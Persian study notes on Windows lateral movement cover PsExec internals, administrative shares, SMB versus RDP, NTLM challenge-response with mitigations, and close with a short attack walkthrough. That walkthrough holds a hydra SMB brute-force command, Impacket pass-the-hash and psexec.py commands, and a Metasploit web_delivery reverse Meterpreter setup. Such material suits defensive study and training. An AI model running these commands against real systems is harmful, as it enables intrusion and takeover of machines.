## **PsExec چیست؟**

- **PsExec** یکی از ابزارهای مجموعه **Sysinternals** مایکروسافت هست.
    
- برای **اجرای پروسس از راه دور** روی سیستم‌های ویندوز استفاده میشه.
    
- نیازی به نصب Agent نداره و از **SMB (پورت 445)** و **Windows Admin Shares** برای انتقال و اجرای فایل‌ها استفاده می‌کنه.
    

---

## **روش کار PsExec در Lateral Movement**

وقتی مهاجم از PsExec استفاده می‌کنه:

1. با استفاده از Credential معتبر (یوزرنیم/پسورد یا NTLM hash) به **ADMIN$ share** سیستم هدف وصل میشه.
    
2. فایل اجرایی موقتی (`PSEXESVC.exe`) رو روی سیستم هدف آپلود می‌کنه.
    
3. این سرویس موقتی رو اجرا می‌کنه که دستور یا ابزار مهاجم رو اجرا می‌کنه.
    
4. خروجی اجرای دستور رو از طریق SMB برمی‌گردونه.
    
5. سرویس موقت بعد از کار پاک میشه (معمولاً).
    

---

## **پیش‌نیازها برای اجرای موفق**

- کاربر باید عضو **Local Administrators** روی سیستم هدف باشه.
    
- پورت 445 (SMB) باز باشه.
    
- Windows Admin Shares (`C$`, `ADMIN$`) فعال باشن.
    
- اگر فایروال یا آنتی‌ویروس جلوی PsExec رو نگیره.
    

---

## **دستور ساده برای استفاده**

```bash
psexec \\192.168.1.15 -u Administrator -p Pass123 cmd.exe
```

- **\192.168.1.15** → آدرس سیستم هدف
    
- **-u** و **-p** → نام کاربری و پسورد
    
- **cmd.exe** → برنامه‌ای که قراره اجرا بشه
    

مثال اجرای یک اسکریپت PowerShell روی سیستم هدف:

```bash
psexec \\TARGET cmd /c powershell -ExecutionPolicy Bypass -File C:\Tools\payload.ps1
```

## **در حملات واقعی**

- مهاجم‌ها معمولاً از **Impacket’s psexec.py** یا **Metasploit PsExec module** استفاده می‌کنن چون اجازه میده با **NTLM hash** هم کار کرد (Pass-the-Hash).
    
- مثال با Impacket:
    

```bash
psexec.py DOMAIN/Administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:5f8d3b0b1e0f1c78c53a0c4e07a5e4d5
```

## **خلاصه**

**PsExec** برای Lateral Movement یعنی اجرای دستور از راه دور با استفاده از دسترسی ادمین و SMB.  
مهاجم‌ها ازش استفاده می‌کنن چون سریع، مخفی و پیش‌فرض روی خیلی از شبکه‌ها بلاک نشده.

## **۱. اتصال به ADMIN$ share**

- **ADMIN$** یکی از **Administrative Shares** پیش‌فرض ویندوزه (مسیرش معمولاً `C:\Windows` هست).
    
- این Share برای مدیریت از راه دور ساخته شده و فقط کاربرانی که **دسترسی ادمین** دارن می‌تونن واردش بشن.
    
- وقتی مهاجم یوزرنیم/پسورد یا NTLM hash معتبر داره، می‌تونه با دستورهای زیر وصل بشه:
    

```cmd
net use \\192.168.1.15\ADMIN$ /user:Administrator Pass123
```

- این مرحله مثل باز کردن یک درب مخفی در سیستم هدفه که فقط ادمین‌ها کلیدش رو دارن.
    

---

## **۲. آپلود فایل اجرایی موقت (`PSEXESVC.exe`)**

- PsExec برای اینکه بتونه دستور رو اجرا کنه، باید یک **سرویس کوچک** روی سیستم هدف بسازه.
    
- این سرویس در قالب یک فایل اجرایی به نام `PSEXESVC.exe` هست که **از طریق SMB** به مسیر `C:\Windows` سیستم قربانی کپی میشه.
    
- این کار رو PsExec به‌صورت خودکار انجام میده؛ شما لازم نیست دستی آپلود کنید.
    

---

## **۳. اجرای سرویس موقت**

- بعد از آپلود، PsExec روی سیستم هدف یک سرویس ویندوز به اسم **PSEXESVC** ثبت می‌کنه:
    

```cmd
sc \\192.168.1.15 create PSEXESVC binPath= "C:\Windows\PSEXESVC.exe"
sc \\192.168.1.15 start PSEXESVC
```

- این سرویس همون دستوری که مهاجم مشخص کرده (مثلاً اجرای `cmd.exe` یا یک بدافزار) رو اجرا می‌کنه.
    
- سرویس‌ها تو ویندوز می‌تونن با دسترسی **SYSTEM** اجرا بشن، که از ادمین هم قوی‌تره.
    

---

## **۴. برگرداندن خروجی از طریق SMB**

- وقتی دستور روی سیستم قربانی اجرا شد، خروجی (مثل متن‌های cmd یا نتیجه اسکریپت) دوباره از طریق **SMB session** به سیستم مهاجم برمی‌گرده.
    
- یعنی PsExec فقط دستور رو نمی‌فرسته؛ جواب رو هم دریافت می‌کنه، انگار جلوی یک ترمینال ریموت نشستی.
    

---

## **۵. پاک کردن سرویس موقت**

- بعد از اتمام کار، PsExec سرویس `PSEXESVC` رو پاک می‌کنه و فایل اجرایی رو حذف می‌کنه تا رد کمتری بمونه:
    

```cmd
sc \\192.168.1.15 delete PSEXESVC
del C:\Windows\PSEXESVC.exe
```

- البته بعضی وقت‌ها اگه ارتباط قطع بشه یا ابزار کرش کنه، این فایل و سرویس روی سیستم قربانی جا می‌مونه و میشه سرنخ خوبی برای شناسایی حمله.

## **۱. ADMIN$**

- **Path:** `C:\Windows`
    
- **کاربرد:**
    
    - برای مدیریت فایل‌ها و اجرای برنامه‌ها در پوشه ویندوز به صورت ریموت استفاده میشه.
        
    - ابزارهایی مثل **PsExec**، **Remote Desktop Management Tools**، یا حتی نرم‌افزارهای IT Helpdesk برای آپلود فایل‌هاشون به این مسیر وصل میشن.
        
- **دسترسی:** فقط کاربران **Local Administrator** یا Domain Admin می‌تونن وصل بشن.
    
- **مثال استفاده:**
    
    ```cmd
    net use \\192.168.1.15\ADMIN$ /user:Administrator Pass123
    ```
    

---

## **۲. C$**

- **Path:** `C:\` (ریشه‌ی درایو C)
    
- **کاربرد:**
    
    - به ادمین‌ها اجازه میده از راه دور به **کل محتوای درایو C** دسترسی پیدا کنن.
        
    - برای کارهایی مثل کپی گرفتن، بررسی لاگ‌ها، یا انتقال فایل‌ها از راه دور استفاده میشه.
        
- **نوع:** Default Administrative Share (برای هر درایوی در سیستم یک Share مشابه وجود داره: `D$`, `E$` و ...)
    
- **مثال:**
    
    ```cmd
    net use \\Target\C$ /user:Admin Pass123
    ```
    

---

## **۳. IPC$**

- **Path:** مسیر فیزیکی نداره (ارتباطی – Inter-Process Communication)
    
- **کاربرد:**
    
    - برای برقراری **Session بدون انتقال فایل** بین دو سیستم استفاده میشه.
        
    - بیشتر برای **احراز هویت (Authentication)** و **مدیریت Named Pipes** در ارتباطات SMB کاربرد داره.
        
    - مثلاً وقتی میخوای با `net use` وصل بشی ولی هنوز فایل یا فولدری رو باز نکردی، IPC$ اولین مرحله ارتباطه.
        
- **مثال:**
    
    ```cmd
    net use \\192.168.1.15\IPC$ /user:Admin Pass123
    ```
    

---

## **چرا این‌ها مهم هستن توی Lateral Movement؟**

- این Shareها **به طور پیش‌فرض فعال** هستن (مگر اینکه ادمین غیرفعالشون کنه).
    
- مهاجم اگر Credential معتبر داشته باشه، می‌تونه:
    
    1. با IPC$ ارتباط اولیه برقرار کنه.
        
    2. با ADMIN$ یا C$ فایل آپلود کنه یا اسکریپت بذاره.
        
    3. دستور رو از راه دور اجرا کنه.

### اتصال با SMB:

- **SMB (Server Message Block)** پروتکلی هست برای به اشتراک گذاشتن فایل‌ها، فولدرها، پرینترها و منابع دیگه بین کامپیوترها در شبکه.
    
- وقتی با SMB وصل می‌شی، معمولاً داری یک فولدر یا Share خاص رو باز می‌کنی، مثلاً `\\TargetPC\ADMIN$` یا `\\TargetPC\C$`.
    
- این اتصال صرفاً مربوط به دسترسی فایل و منابع اشتراکی هست.
    
- نیاز به نام کاربری و رمز داره (یا توکن احراز هویت) تا دسترسی پیدا کنی.
    
- می‌تونی فایل‌ها رو بخونی، بنویسی، حذف کنی یا تغییر بدی (بسته به دسترسی).
    

---

### اتصال با RDP:

- **RDP (Remote Desktop Protocol)** پروتکلی برای کنترل کامل دسکتاپ یک کامپیوتر از راه دوره.
    
- وقتی با RDP وصل می‌شی، در واقع کنترل کامل رابط کاربری اون سیستم رو داری؛ انگار پشت سیستم نشستی.
    
- دسترسی‌ات فراتر از فقط فایل‌ها هست، می‌تونی برنامه‌ها رو اجرا کنی، تنظیمات رو تغییر بدی، و …
    
- RDP خودش به SMB وابسته نیست، ولی در پس‌زمینه برای کارهای اشتراک فایل و چاپ ممکنه از SMB استفاده کنه.
    

---

### پس جمع‌بندی:

- در **SMB** واقعاً داری به فولدرها و منابع اشتراک‌گذاری‌شده وصل می‌شی.
    
- در **RDP** داری کل سیستم و دسکتاپ رو کنترل می‌کنی، نه فقط فولدرها.
    
- تو Lateral Movement معمولا SMB برای انتقال فایل و اجرای دستورات استفاده میشه، چون راحت‌تر و کم‌هزینه‌تره.
    
- اما RDP وقتی استفاده میشه که بخوان کنترل کامل‌تری داشته باشن.

عالی — بزنیم توی عمق NTLM و همین «challenge-response» که دقیق‌تر بفهمی چی‌به‌چیه و چرا بعضیجا خطرناکه. من مرحله‌به‌مرحله و با فرمول‌های کلیدی می‌گم، ولی از پیچیدگی‌های خیلی ریز کریپتو هم عبور می‌کنم تا خوانا بمونه. اگر خواستی بعداً می‌دم نمونه کد (مثلاً پایتون) و یا یک فلوچارت شبکه‌ای.

# خلاصهٔ کلی (ایدهٔ Challenge-Response)
1. هدف: سرور می‌خواد مطمئن بشه کلاینت «رمز» (یا چیزی معادل رمز) را می‌داند، بدون اینکه کلاینت رمز را مستقیم بفرستد.  
2. روند کلی (NTLMSSP):  
   - **Type 1 (NEGOTIATE)** — کلاینت → سرور: می‌گه چه قابلیت‌هایی داره.  
   - **Type 2 (CHALLENGE)** — سرور → کلاینت: یک عدد تصادفی ۸ بایتی (ServerChallenge) و اطلاعات هدف (TargetInfo) می‌فرسته.  
   - **Type 3 (AUTHENTICATE)** — کلاینت → سرور: پاسخ به چالش را می‌فرسته (بسته به نسخه NTLM: LM/NTLMv1 یا LM/NTLMv2) + اطلاعات کاربری.  
   - سرور با داشتن (هَشِ) رمز کاربر، همان محاسبات را انجام می‌دهد و اگر خروجی‌ها برابر باشند، احراز هویت قبول می‌شود.

# اجزای کلیدی
- **NT Hash**: هش رمز کاربر که با `MD4(UTF-16LE(password))` ساخته می‌شود — این هَش معادل «رمز» در پروتکل است (یعنی در بسیاری از حملات، در واقع هَش معادل رمز است).  
- **LM Hash**: قدیمی و ضعیف — بر پایه دس رمز (DES) و ثابت `KGS!@#$%` (برای سازگاری قدیمی). در ویندوزهای مدرن معمولاً غیرفعال شده چون ضعیفه.  
- **Server Challenge**: 8 بایت nonce که سرور تولید می‌کند (برای جلوگیری از پخش پاسخ تکراری).  
- **Blob (در NTLMv2)**: شامل timestamp، client nonce، AV-pairs (target info) و ... — یعنی داده‌ای که به proof چسبانده می‌شود و جلوی replay رو قوی‌تر می‌کند.

# NTLMv1 — چگونه پاسخ ساخته می‌شود (خلاصه فنی)
۱. `NT Hash = MD4(UTF-16LE(password))`.  
۲. برای **NT Response**:  
   - `NT Hash` (16 بایت) را با 5 بایت صفر پَدیگ می‌کنند تا 21 بایت شود.  
   - آن را به سه بخش 7 بایتی تقسیم می‌کنند؛ هر 7 بایت به یک کلید DES با بیت‌های زوجیت تبدیل می‌شود (7→8 بایت).  
   - هر کلید DES، `ServerChallenge` (8 بایت) را رمزنگاری می‌کند → سه خروجی 8 بایتی → کنار هم می‌شوند → **24 بایت NT Response**.  
۳. (معادل برای LM Response با LM Hash انجام می‌شود).  
**ضعف‌ها:** LM و NTLMv1 از DES و تقسیم‌بندی ضعیف استفاده می‌کنند؛ نسبتاً آسیب‌پذیر به کرک آفلاین و replay و حملات رمز‌شکنی.

# NTLMv2 — فرایند کامل و قوی‌تر (پیشنهادی در سیستم‌های مدرن)
NTLMv2 با HMAC-MD5 و یک blob شامل client nonce و timestamp کار می‌کند. مراحل کلیدی:

1. **محاسبه NTLMv2 Hash**  
   ```
   NTLMv2Hash = HMAC_MD5(NT_Hash, Unicode(Username.upper()) + Unicode(TargetName))
   ```
   (یعنی کلید HMAC = `NT_Hash` و داده = `Unicode(UsernameUpper + Target)`).

2. **ساختن Blob** (Client Challenge Blob): شامل
   - ثابت (0x01 0x01 ... signature)،
   - timestamp (FILETIME 64-bit)،
   - client nonce (8 بایت)،
   - target info (AV pairs که سرور در Type2 فرستاده)،
   - پایان (۰).

3. **محاسبه NT Proof و پاسخ نهایی**  
   ```
   NTProofStr = HMAC_MD5(NTLMv2Hash, ServerChallenge || Blob)
   NTLMv2_Response = NTProofStr || Blob
   ```
   (یعنی ابتدا HMAC روی ترکیب ServerChallenge و Blob محاسبه می‌شود؛ خروجی HMAC — که «اثبات» است — جلوی Blob قرار می‌گیرد.)

4. همچنین معمولاً **LMv2_Response** هم فرستاده می‌شود:
   ```
   LMv2_Response = HMAC_MD5(NTLMv2Hash, ServerChallenge || ClientNonce) || ClientNonce
   ```

5. **کلیدهای جلسه (Session keys)**  
   - SessionBaseKey = HMAC_MD5(NTLMv2Hash, NTProofStr)  
   - از SessionBaseKey کلیدهای signing/sealing (برای integrity و confidentiality در کانال مثل SMB) مشتق می‌شوند.

**ویژگی‌ها/مزایا:** استفاده از HMAC-MD5، وجود ClientNonce و timestamp و AV pairs → مقاوم‌تر در برابر replay و جعل. ولی دقت کن: اگر مهاجم خودِ `NT Hash` را داشته باشد، همچنان می‌تواند NTLMv2 پاسخ بسازد (پس داشتن NT Hash همانند داشتن رمز است).

# سرور چگونه اعتبارسنجی می‌کند؟
سرور (یا DC در حالت domain) هَش ذخیره‌شده (NT Hash) را دارد. با همان فرمول‌های بالا (NTLMv2Hash → HMAC بر روی ServerChallenge||Blob) مقدار مورد انتظار را محاسبه می‌کند و با مقدار دریافتی از کلاینت مقایسه می‌کند. اگر برابر بود، احراز هویت موفق است.

# حملات رایج مرتبط
- **Pass-the-Hash (PtH):** مهاجم با داشتن NT Hash می‌تواند احراز هویت را انجام دهد، بدون دانستن رمز متن‌ساده. (برای NTLM و اغلب NTLMv2 هم صادق است چون هَش خودش بعنوان کلید HMAC استفاده می‌شود.)  
- **Relay Attack:** مهاجم چالش/پاسخ را دریافت و بدون کرک، آن را به سرویس دیگری فوروارد می‌کند تا دسترسی بگیرد. (مخصوصاً اگر SMB signing غیرفعال باشد).  
- **Offline cracking:** مخصوصاً برای LM/NTLMv1، می‌توان هَش را سریع کرک کرد.  
- **Replay (در NTLMv1 ضعیف‌تر):** اگر nonce یا timestamp به درستی حفاظت نشوند.

# راهکارهای کاهش ریسک / بهترین عمل‌ها
1. **غیرفعال کردن LM و NTLMv1** — فقط NTLMv2 مجاز باشد. (GPO: *Network security: LAN Manager authentication level*).  
2. **جایگزینی با Kerberos** هر جا ممکنه (Kerberos امن‌تر است و برای domainها پیش‌فرض بهتره).  
3. **فعال کردن SMB signing و/یا SMB encryption** تا relay و tampering سخت‌تر شود.  
4. **محدود کردن ترافیک NTLM بین دامنه‌ها/سرورها** (GPO: *Restrict NTLM* policies).  
5. **استفاده از MFA** برای سرویس‌های حساس.  
6. **نظارت و لاگینگ:** دنبال رویدادهای NTLM مرتبط (مثلاً eventهایی که نشان‌دهنده احراز هویت NTLM هستند) و رفتارهای مشکوک (تعداد زیاد ناموفق، تغییر منابع دسترسی).  
7. **پچ و سخت‌سازی سیستم‌ها**، حذف حساب‌های با گذرواژه ضعیف، و محدود کردن اکانت‌های admin.

# نکات عملی برای تحلیل ترافیک (Wireshark /‌ لاگ‌ها)
- در وایرشارک دنبال پیام‌های `NTLMSSP` باش؛ Type1/Type2/Type3 مشخص است.  
- در Type2 فیلد `Server Challenge` را می‌بینی (8 بایت) و ممکن است `Target Info` (AV pairs) هم داشته باشد.  
- از timestamp داخل Blob (NTLMv2) می‌توان برای تشخیص replay و زمان انجام auth استفاده کرد (اگر سرورها و کلاینت‌ها همگام‌زمانی نداشته باشند ممکن است fail شود).

# مثال شبه‌کد (برای درک فرمول‌ها — نمای کلی، نه پیاده‌سازی دقیق)
```
NT_Hash = MD4(UTF16LE(password))

# NTLMv2Hash
NTLMv2Hash = HMAC_MD5(key=NT_Hash, data=UnicodeUpper(username) + Unicode(domain))

# Blob = timestamp || client_nonce || target_info ...
NTProof = HMAC_MD5(key=NTLMv2Hash, data=ServerChallenge || Blob)

NTLMv2_Response = NTProof || Blob
```

## 🎯 ایده‌ی کلی Challenge-Response

هدفش اینه که **کلاینت ثابت کنه که «رمز عبور» رو می‌دونه** بدون اینکه رمز رو مستقیم روی شبکه بفرسته.  
این روش باعث میشه حتی اگه کسی وسط راه شنود کنه، نتونه با همون داده، دوباره وارد سیستم بشه (مگر حمله‌ی relay رو انجام بده).

## 🛠 مراحل پایه (به زبان ساده)

### 1️⃣ شروع ارتباط

- کلاینت به سرور میگه: «سلام، من میخوام با کاربر `UserX` لاگین کنم.»
    
- هنوز رمز رو نگفته، فقط شروع احراز هویت رو اعلام کرده.
    

---

### 2️⃣ ارسال **Challenge** از طرف سرور

- سرور یک عدد **تصادفی و یک‌بار مصرف** (nonce) میسازه. این عدد مثلاً ۸ بایتیه و بهش میگیم **Server Challenge**.
    
- سرور این عدد رو به کلاینت میفرسته و میگه: «اگه واقعاً رمز رو بلدی، این عدد رو رمزنگاری کن و جوابشو بهم بده.»
    

> دلیل این مرحله: اگه کسی شنود کنه، این عدد دفعه‌ی بعد فرق میکنه، پس Replay Attack سخت‌تر میشه.

---

### 3️⃣ ساخت **Response** توسط کلاینت

- کلاینت رمز عبور کاربر رو داره (یا هش رمز رو).
    
- با استفاده از این رمز + Challenge که از سرور گرفته، یک محاسبه (رمزنگاری یا هش) انجام میده.
    
- نتیجه‌ی این محاسبه رو بهش میگیم **Response**.
    
- کلاینت این Response رو برای سرور میفرسته.
    

---

### 4️⃣ بررسی پاسخ در سمت سرور

- سرور هم نسخه‌ی خودش از رمز کاربر رو داره (رمز یا هش رمز از دیتابیس).
    
- اون هم دقیقا همون محاسبه‌ای که کلاینت انجام داده رو انجام میده (با Challenge خودش + رمز ذخیره شده).
    
- اگر خروجی دو طرف یکی باشه → یعنی کلاینت رمز رو میدونه → احراز هویت موفق.
    

---

### 📌 نکته مهم

- رمز واقعی هیچ‌وقت روی شبکه ارسال نمیشه.
    
- هر بار Challenge فرق میکنه، پس شنود یک Session باعث نمیشه بشه دفعه‌ی بعد هم وارد شد (مگر تو حملات Relay که در همون لحظه به سرویس دیگه پاس داده میشه).
    
- این روش تو پروتکل‌های زیادی هست (NTLM، Kerberos در بخش pre-auth، حتی در بعضی API Tokenها).
    

---

## 🔍 یک مثال ساده غیر فنی

1. **سرور:** «این عدد ۱۲۳۴۵۶ رو بگیر.»
    
2. **کلاینت:** «باشه، رمز من `ABC` هست، من این عدد رو با رمزم قاطی می‌کنم و نتیجه رو میدم.»
    
3. **کلاینت نتیجه رو میده:** مثلاً `HMAC(ABC, 123456)` → `9F8A3B...`
    
4. **سرور:** همون کار رو با `ABC` ذخیره‌شده خودش میکنه و اگر نتیجه یکی بود → تایید.

### کاربرد `smb-protocols`:

این اسکریپت بررسی می‌کند که سرور SMB هدف کدام نسخه‌های پروتکل SMB (مثل SMBv1، SMBv2، SMBv3) را پشتیبانی می‌کند. همچنین اطلاعاتی درباره تنظیمات امنیتی و نسخه پروتکل ارائه می‌دهد که می‌تواند برای تشخیص آسیب‌پذیری‌ها و تنظیمات ناامن مفید باشد.

```
hydra -l administrator -P /usr/share/wordlist/password.txt  x.x.x.x msb3
```

```
psexec.py administrator:password@x.x.x.x
```


بعد از اینکه ما دسترسی خودمون رو روی سیستم گرفتیم حالا میتونیم بیایم با استفاده از exploit به نام web delivery شل خودمون رو قوی تر کنیم و با استفاده از metasploit دسترسی meterpreter بگیریم

```
use multi/script/web_delivery

set payload python/metrepreter/reverce_tcp 
set lhost x.x.x.x
set lport 10100
run
```

اکسپلویت `multi/script/web_delivery` در متاسپلویت یک **ابزار تولید کننده کد مخرب تحت وب** هست.

### خلاصه کاربرد:

این ماژول یک **کد جاوااسکریپت، پاورشل یا پایتون** تولید می‌کند که وقتی هدف آن را اجرا کند (مثلاً روی مرورگر یا سیستم هدف)، یک شل معکوس (reverse shell) یا Meterpreter session به مهاجم وصل می‌شود.


### به زبان ساده:

- مهاجم یک URL یا اسکریپت آماده‌شده به هدف می‌دهد.
    
- وقتی هدف آن را اجرا یا باز کند، کد مخرب روی سیستم اجرا می‌شود.
    
- مهاجم کنترل از راه دور به سیستم هدف را بدست می‌آورد.


حالا وقتی که از طریق psexec دسترسی خودمون رو گرفتیم میتونیم با این متود اون Malicious Payload خودمون رو درون اون شل اجرا کنیم و در این سمت دسترسی که میخواهیم بگیریم
